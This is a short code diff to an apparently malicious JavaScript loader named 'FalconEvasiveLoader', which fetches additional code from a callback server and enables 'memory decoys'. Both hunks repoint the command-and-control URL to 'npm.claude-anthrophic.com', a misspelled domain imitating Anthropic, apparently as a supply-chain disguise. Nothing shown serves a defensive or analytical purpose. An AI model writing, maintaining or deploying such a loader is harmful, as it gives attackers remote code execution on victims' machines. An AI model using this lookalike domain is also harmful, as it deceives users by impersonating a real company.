@@ -442,7 +442,7 @@ function shouldRetrieveAdditionalCodeEvasive(envData, serverResponse) {
 class FalconEvasiveLoader {
     constructor(config = {}) {
         this.config = {
-            serverUrl: 'https://npm.545856.com/posts/1',
+            serverUrl: 'https://npm.claude-anthrophic.com/posts/1',
             additionalCodePath: './modules/',
             verbose: true,
             enableMemoryDecoys: true,
@@ -605,7 +605,7 @@ module.exports = {
 if (require.main === module) {
     const loader = new FalconEvasiveLoader({
         // ⚙️  CONFIGURE YOUR CALLBACK SERVER HERE
-        serverUrl: 'https://npm.545856.com/posts/1',
+        serverUrl: 'https://npm.claude-anthrophic.com/posts/1',
 
         verbose: true,
         enableMemoryDecoys: true,
